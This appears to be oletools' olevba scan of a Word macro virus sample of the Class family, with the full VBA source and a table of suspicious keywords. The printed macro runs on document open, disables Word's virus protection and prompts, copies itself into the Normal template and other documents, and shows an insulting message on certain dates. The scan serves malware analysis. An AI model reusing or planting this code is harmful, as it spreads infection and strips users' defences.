olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-3be8573d5cd85d4e5887cb3b90393d2122d77618
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-3be8573d5cd85d4e5887cb3b90393d2122d77618 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'igino13/04/99 18.52.45HP DeskJet 400 Printer on LPT1:SistemiClippy
On Error GoTo out
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
Options.VirusProtection = False
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
Options.SaveNormalPrompt = False
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
Options.ConfirmConversions = False
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
If nt > 70 And ad > 0 Then GoTo out
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
If nt < 70 Then
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
End If
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
host.codemodule.AddFromFile ("c:\class.sys")
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
With host.codemodule
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
    For x = 1 To 4
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
    .deletelines 1
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
    Next x
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
End With
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
If nt < 70 Then
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
    With host.codemodule
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
    .replaceline 1, "Sub AutoClose()"
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
    .replaceline 71, "Sub ToolsMacro()"
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
    End With
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
End If
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
With host.codemodule
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
    For x = 2 To 72 Step 2
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
    Next x
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
End With
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
out:
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
End Sub
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
Sub ViewVBCode()
'igino13/04/99 18.52.46HP DeskJet 400 Printer on LPT1:SistemiClippy
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

